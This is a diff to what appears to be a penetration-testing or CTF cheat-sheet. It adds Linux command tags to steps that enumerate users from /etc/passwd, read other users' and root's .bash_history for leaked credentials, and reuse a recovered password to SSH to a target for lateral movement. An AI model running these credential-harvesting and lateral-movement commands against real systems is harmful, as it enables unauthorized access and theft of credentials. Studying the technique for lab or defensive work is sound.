@@ -18,16 +18,19 @@ Users frequently type credentials directly on the command line (database logins,
 ## Steps
 
 ### 1. Find users on the system
+<!-- cmd: linux -->
 ```bash
 cat /etc/passwd | grep "bash\|sh$"
 ```
 
 ### 2. Find files owned by a target user
+<!-- cmd: linux -->
 ```bash
 find / -user drac 2>/dev/null
 ```
 
 ### 3. Read bash history
+<!-- cmd: linux -->
 ```bash
 cat /home/drac/.bash_history
 ```
@@ -38,6 +41,7 @@ mysql -u drac -p 'Th3dRaCULa1sR3aL'
 ```
 
 ### 4. Try credentials for lateral movement
+<!-- cmd: linux -->
 ```bash
 ssh drac@TARGET_IP
 # Password: Th3dRaCULa1sR3aL
@@ -45,6 +49,7 @@ ssh drac@TARGET_IP
 
 ## Sweep All Users
 
+<!-- cmd: linux -->
 ```bash
 cat /home/*/.bash_history /root/.bash_history 2>/dev/null
 ```
